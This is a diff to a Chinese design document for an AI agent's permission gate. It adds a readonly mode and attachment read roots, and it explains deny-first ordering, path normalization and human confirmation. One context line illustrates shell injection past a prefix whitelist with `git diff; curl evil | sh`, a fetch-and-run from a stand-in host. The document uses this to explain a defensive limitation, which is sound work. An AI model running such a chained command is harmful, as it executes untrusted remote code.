@@ -8,7 +8,7 @@
 
 ## 设计决策
 
-- **三档输出、顺序短路**：判定链每一步都可能直接返回，后续不再看。顺序为 deny 黑名单 → allow 白名单 → 工作目录越界检查 → safeTools → 会话级授权 → confirm。deny 永远最先：一条命中黑名单的调用无论白名单如何配置都不会执行。
+- **三档输出、顺序短路**：判定链每一步都可能直接返回，后续不再看。只读模式最优先——`fs_write`/`fs_edit`/`exec` 在 readonly 下无条件拒绝，连白名单都不到达；其余顺序为 deny 黑名单 → allow 白名单 → 工作目录越界检查 → safeTools → 会话级授权 → confirm。deny 永远先于放行：一条命中黑名单的调用无论白名单如何配置都不会执行。
 - **规则是扁平字符串，不是结构化对象**：`"exec:git *"` 这类前缀通配规则写在 `config.yaml` 里，人和模型都可读可写；编译只做一次切分，匹配用无正则的回溯算法。
 - **匹配对象按工具提取**：exec 匹配命令字符串、写文件工具匹配路径、其余工具匹配整个参数的 JSON 文本——规则作用于"该调用要执行的动作"，而不是原始参数对象。
 - **路径规则双向匹配**：规则同时按原始形态和规范化形态（`~` 展开 + 相对工作目录解析）测试，同一文件以不同写法（`~/.ssh/x` / `.ssh/x` / `/Users/u/.ssh/x`）均不能绕过 deny。
@@ -23,7 +23,7 @@
 // 判定结果（定义在 packages/core/src/agent/loop.ts，gate 实现它）
 export type PermissionDecision =
   | { type: "allow"; reason: "safe" | "whitelist" | "session_grant" }
-  | { type: "deny"; reason: "blacklist" | "user_denied" | "timeout"; noteText: string }
+  | { type: "deny"; reason: "blacklist" | "user_denied" | "timeout" | "readonly"; noteText: string }
   | { type: "confirm"; confirmationId: string }
 
 export interface PermissionGate {
@@ -48,6 +48,8 @@ export class ConfigPermissionGate implements PermissionGate {
     grants?: SessionGrants         // 仅当 config 开启 sessionGrants 时被查询
     newConfirmationId?: () => string
     workspace?: string             // 会话工作目录，越界判定与路径规范化用它
+    readRoots?: string[]           // 额外可读根：fs_read/fs_list 视同工作区（daemon 传附件目录）
+    readonly?: boolean             // 只读模式：fs_write/fs_edit/exec 一律拒绝
   })
   check(toolCall: ToolCallBlock): Promise<PermissionDecision>
 }
@@ -84,6 +86,8 @@ permissions:
 ### 2. 判定链（`check` 的短路顺序）
 
 ```
+⓪ readonly 且工具 ∈ {fs_write, fs_edit, exec}
+                        → deny {reason:"readonly", noteText:"只读模式（readonly）"}
 ① deny 规则命中        → deny {reason:"blacklist", noteText:"规则命中黑名单: <原规则>"}
 ② allow 规则命中       → allow {reason:"whitelist"}
 ③ 越界检查（文件工具）  → confirm（见下，即使工具是 safe）
@@ -91,6 +95,8 @@ permissions:
 ⑤ sessionGrants 开启且授权命中 → allow {reason:"session_grant"}
 ⑥ 以上全不中            → confirm，签发新 conf_ id
 ```
+
+exec 走专属分支：deny 对**每个归一化子命令**分别匹配；allow 与会话授权只在命令**恰好一段**（无接续符）时参与——`exec:git status*` 不可能放行 `git status; …`。两分支都未命中即 confirm。
 
 ### 3. 路径规范化匹配（防拼写绕过）
 
@@ -107,20 +113,27 @@ permissions:
 `FILE_TOOLS = {fs_read, fs_list, fs_write, fs_edit}` 的 `path` 参数做越界判定：按上面的方式展开解析后，`resolved` 既不等于工作目录根、也不以 `根 + 路径分隔符` 开头，即视为越界 → **直接 confirm**。要点：
 
 - 位置在 deny/allow **之后**：黑名单与白名单的优先级更高，先判完才轮到边界。
-- safe 工具不豁免：fs_read/fs_list 越界同样要人确认。
+- safe 工具不豁免：fs_read/fs_list 越界同样要人确认——唯一例外是 `readRoots`（见下节）。
 - 工作目录本身允许（`resolved === root`，如对根目录 fs_list）。
 - 工作目录未设置时不做该检查（legacy 行为）；daemon 侧的取值是会话元数据的 `workdir`，缺省回退 `config.workspace`（`packages/server/src/run.ts`）。
 
 exec 没有可判定的"目标路径"——命令可以以任何方式访问文件系统，所以对 exec **没有越界精确判定**，处理策略是：命中 deny/allow 之外的一律 confirm，由人工审视命令本身。
 
-### 5. 敏感工具清单怎么定
+### 5. 只读模式与附件读豁免
+
+gate 的两个 daemon 侧开关（都来自 `ConfigPermissionGateOptions`）：
+
+- **readonly**：布尔开关，`fs_write`/`fs_edit`/`exec`（引擎内 `WRITE_TOOLS` 集合）在判定链第 ⓪ 步直接拒绝——reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。来源有两个（任一为真即生效）：daemon 级 `--readonly` 启动旗标（`LaunchDaemonOptions.readonly` → RunManager），或单会话切换（`POST /sessions/:id/readonly` 写入 `meta.readonly`）。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行——这个模式承诺的是零写入风险。
+- **readRoots**：额外可读根列表。`READ_FILE_TOOLS = {fs_read, fs_list}` 的目标落在其中任一根之内时不算越界（免确认）；写类工具永不豁免。daemon 装配传 `[<home>/attachments]`——上传的附件对会话而言就是"工作区的一部分"，模型用 fs_read 读取它无需逐次人工放行。
+
+### 6. 敏感工具清单怎么定
 
 引擎不硬编码清单。daemon 装配（`packages/server/src/run.ts`）把 `createBuiltinTools` 产物里 `risk === "safe"` 的执行器名收集为 `safeTools` 传入 gate。按当前 9 个内置工具的声明（见 [tools](./tools.md)）：
 
 - **safe（命中即自动放行）**：`fs_read`、`fs_list`、`web_search`、`web_fetch`、`memory_save`、`memory_search`——共 6 个，全是不改工作目录状态的 parallel 工具；
-- **sensitive（无 allow 规则命中必然 confirm）**：`exec`、`fs_write`、`fs_edit`——共 3 个。注意 fs_read/fs_list 虽是 safe，目标越界时仍进入 confirm（第 4 步）。
+- **sensitive（无 allow 规则命中必然 confirm）**：`exec`、`fs_write`、`fs_edit`——共 3 个。注意 fs_read/fs_list 虽是 safe，目标越界且不在 readRoots 内时仍进入 confirm（第 ③ 步）；MCP 适配器工具（见 [mcp](./mcp.md)）一律声明 sensitive。
 
-### 6. 人工确认流程
+### 7. 人工确认流程
 
 ```
 gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID——按时间递增、可排序的唯一 ID）
@@ -141,19 +154,20 @@ gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID——按时间
   - 超时/取消后 RunManager 调 `expire` 把条目标记失效，迟到的裁决只会收到 unknown confirmation，不会确认一个已无人等待的动作。
 - deny 的 `user_denied` / `timeout` 两个 reason 不是 gate 产出的：gate 只产生 `blacklist` 拒绝，前两者是循环把人工拒绝/超时转成 error result 时的语义标记（note 块的 `kind`）。
 
-### 7. grantedBy 记录
+### 8. grantedBy 记录
 
 每个被放行的调用都会把原因记在 tool 消息上：`ToolMessage.grantedBy: Record<callId, GrantedBy>`（`packages/core/src/protocol/messages.ts`，`GrantedBy = "safe" | "whitelist" | "session_grant" | "confirmed"`）。这是完整的执行审计链——事后可逐调用追溯"这次执行的授权来源"。Web 端审计视图（`packages/web/src/audit/AuditView.tsx`）就按 callId 反查该字段渲染批注。
 
-### 8. 会话级授权（SessionGrants）
+### 9. 会话级授权（SessionGrants）
 
-`SessionGrants` 是进程内存里的授权存储：人工确认某规则后 `grant(rule)` 存入编译后的规则，同一会话内相同调用不再重复询问。生效需要两个条件同时成立：`config.permissions.sessionGrants === true` **且**宿主在构造 gate 时传入 `grants` 存储。当前 daemon 装配只传 `{workspace, safeTools}`，未传 grants——引擎与测试就绪，daemon 侧尚未接线，此分支暂不生效。
+`SessionGrants` 是进程内存里的授权存储：人工确认某规则后 `grant(rule)` 存入编译后的规则，同一会话内相同调用不再重复询问。生效需要两个条件同时成立：`config.permissions.sessionGrants === true` **且**宿主在构造 gate 时传入 `grants` 存储。当前 daemon 装配传的是 `{workspace, safeTools, readRoots, readonly}`，未传 grants——引擎与测试就绪，daemon 侧尚未接线，此分支暂不生效。
 
 ---
 
 ## 边界与出错
 
 - **deny 不防 shell 注入**：exec 的规则匹配的是命令字符串本身，`exec:git diff*` 同样命中 `git diff; curl evil | sh`。白名单只应放前缀可信的命令；真正的防线是默认的 confirm 档——人工可查看完整命令。
+- **readonly 短路一切放行路径**：包括 allow 白名单与会话授权；它不是一条 deny 规则（写不进 config），而是宿主传入的模式开关。
 - **规则大小写敏感**，`*` 之外无其它通配符（`?`、`[]` 都是字面字符）。
 - **SessionGrants 是进程内存**：daemon 重启即清空；且历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
 - **gate 缺失 = 全放行**：循环对未注入 `permissions` 的调用一律 `{type:"allow", reason:"safe"}`——组装宿主时漏配权限网关等于没有权限检查，daemon 装配始终注入。
